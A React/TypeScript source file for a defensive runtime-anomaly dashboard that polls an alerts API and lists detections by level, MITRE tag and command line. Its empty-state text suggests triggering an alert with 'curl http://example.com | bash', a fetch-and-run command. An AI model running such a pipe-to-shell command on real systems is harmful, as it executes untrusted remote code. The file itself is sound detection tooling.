import { useEffect, useState } from 'react'
import useSWR from 'swr'

const fetcher = (url: string) => fetch(url).then(r => r.json())

export default function Dashboard() {
  const { data: alerts } = useSWR('/api/alerts', fetcher, { refreshInterval: 2000 })
  const { data: stats } = useSWR('/api/stats', fetcher, { refreshInterval: 5000 })
  const [filter, setFilter] = useState('all')

  const filtered = (alerts || []).filter((a: any) => filter === 'all' || a.level === filter)

  return (
    <div style={{ fontFamily: 'system-ui', background: '#0f172a', color: '#e2e8f0', minHeight: '100vh', padding: 24 }}>
      <h1 style={{ color: '#38bdf8' }}>N1ceWatch Blue — Runtime Anomaly Dashboard</h1>
      <p>Ubuntu All-Versions • eBPF CO-RE → auditd → /proc fallback • Real-time JSONL</p>

      <div style={{ display: 'flex', gap: 12, margin: '16px 0' }}>
        <div style={card}>Total Alerts: {stats?.total_alerts ?? 0}</div>
        <div style={card}>Provider: eBPF/auditd/proc (auto)</div>
        <div style={card}><a href="http://localhost:8081/report.html" target="_blank" style={{ color: '#38bdf8' }}>HTML Report</a></div>
      </div>

      <div style={{ margin: '12px 0' }}>
        {['all', 'critical', 'high', 'medium', 'low', 'info'].map(l => (
          <button key={l} onClick={() => setFilter(l)} style={{ ...btn, background: filter === l ? '#38bdf8' : '#1e293b', color: filter === l ? '#000' : '#fff' }}>{l}</button>
        ))}
      </div>

      <table style={{ width: '100%', borderCollapse: 'collapse', background: '#1e293b', borderRadius: 12, overflow: 'hidden' }}>
        <thead><tr style={{ background: '#0a0a0a' }}><th style={th}>Time</th><th style={th}>Host</th><th style={th}>Rule</th><th style={th}>Level</th><th style={th}>Mitre</th><th style={th}>Image</th><th style={th}>Cmdline</th></tr></thead>
        <tbody>
          {filtered?.slice(0, 100).map((a: any, i: number) => (
            <tr key={i} style={{ borderTop: '1px solid #334155' }}>
              <td style={td}>{a.ts?.slice(0, 19)}</td>
              <td style={td}>{a.host}</td>
              <td style={td}>{a.rule_name}</td>
              <td style={{ ...td, color: levelColor(a.level) }}>{a.level}</td>
              <td style={td}>{a.mitre}</td>
              <td style={td}>{a.event?.image?.split('/').pop()}</td>
              <td style={{ ...td, maxWidth: 300, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{a.event?.command_line}</td>
            </tr>
          ))}
          {(!filtered || filtered.length === 0) && <tr><td colSpan={7} style={{ padding: 24, textAlign: 'center', color: '#64748b' }}>No alerts yet — trigger: curl http://example.com | bash</td></tr>}
        </tbody>
      </table>

      <div style={{ marginTop: 24, padding: 16, background: '#1e293b', borderRadius: 12 }}>
        <h3>Process Tree (last 5)</h3>
        {filtered?.slice(0, 5).map((a: any, i: number) => (
          <div key={i} style={{ fontFamily: 'monospace', fontSize: 12, margin: '4px 0', color: '#94a3b8' }}>
            {a.event?.parent_image?.split('/').pop() || 'init'} → {a.event?.image?.split('/').pop()} <span style={{ color: '#38bdf8' }}>{a.event?.command_line?.slice(0, 60)}</span>
          </div>
        ))}
      </div>
    </div>
  )
}

const card: any = { background: '#1e293b', padding: '12px 16px', borderRadius: 12, minWidth: 160 }
const btn: any = { padding: '6px 12px', borderRadius: 8, border: 'none', marginRight: 8, cursor: 'pointer' }
const th: any = { padding: 10, textAlign: 'left', fontSize: 12, color: '#94a3b8' }
const td: any = { padding: 8, fontSize: 12 }
function levelColor(l: string) { if (l === 'critical') return '#ef4444'; if (l === 'high') return '#f97316'; if (l === 'medium') return '#eab308'; return '#94a3b8' }
